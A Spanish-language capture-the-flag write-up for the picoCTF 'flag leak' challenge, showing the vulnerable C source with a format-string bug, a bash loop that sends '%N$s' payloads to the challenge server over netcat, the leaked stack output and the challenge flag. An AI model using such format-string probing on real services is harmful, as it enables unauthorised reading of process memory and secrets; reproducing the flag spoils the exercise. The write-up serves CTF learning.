## Descripción 
Story telling class 1/2

Additional details will be available after launching your challenge instance.

## Datos de Acceso al Nivel
user: carlosof / kali
password:

## Solución
```bash
┌──(kali㉿kali)-[~]
└─$ cd retosBinaryExploit
                                                                                 
┌──(kali㉿kali)-[~/retosBinaryExploit]
└─$ mkdir flagleak                                          
                                                                                 
┌──(kali㉿kali)-[~/retosBinaryExploit]
└─$ cd flagleak          
                                                                                 
┌──(kali㉿kali)-[~/retosBinaryExploit/flagleak]
└─$ wget https://artifacts.picoctf.net/c/91/vuln.c          
--2024-11-11 21:10:02--  https://artifacts.picoctf.net/c/91/vuln.c
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 3.161.55.26, 3.161.55.64, 3.161.55.100, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|3.161.55.26|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 947 [application/octet-stream]
Saving to: ‘vuln.c’

vuln.c               100%[===================>]     947  --.-KB/s    in 0s      

2024-11-11 21:10:02 (17.5 MB/s) - ‘vuln.c’ saved [947/947]

                                                                                 
┌──(kali㉿kali)-[~/retosBinaryExploit/flagleak]
└─$ cat vuln.c 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

void readflag(char* buf, size_t len) {
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,len,f); // size bound read
}

void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}
┌──(kali㉿kali)-[~/retosBinaryExploit/flagleak]
└─$ for i in {0..999}; do echo "%$i\$s" | nc saturn.picoctf.net 64062; done

Tell me a story and then I'll tell you one >> Here's a story - 
%0$s
Tell me a story and then I'll tell you one >> Here's a story - 
%1$s
Tell me a story and then I'll tell you one >> Here's a story - 
q��
Tell me a story and then I'll tell you one >> Here's a story - 
�ú,
Tell me a story and then I'll tell you one >> Here's a story - 
Tell me a story and then I'll tell you one >> Here's a story - 
Tell me a story and then I'll tell you one >> Here's a story - 
(null)
Tell me a story and then I'll tell you one >> Here's a story - 
CTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}

```

- Flag: picoCTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}
## Notas Adicionales

## Referencias 
https://play.picoctf.org/practice/challenge/269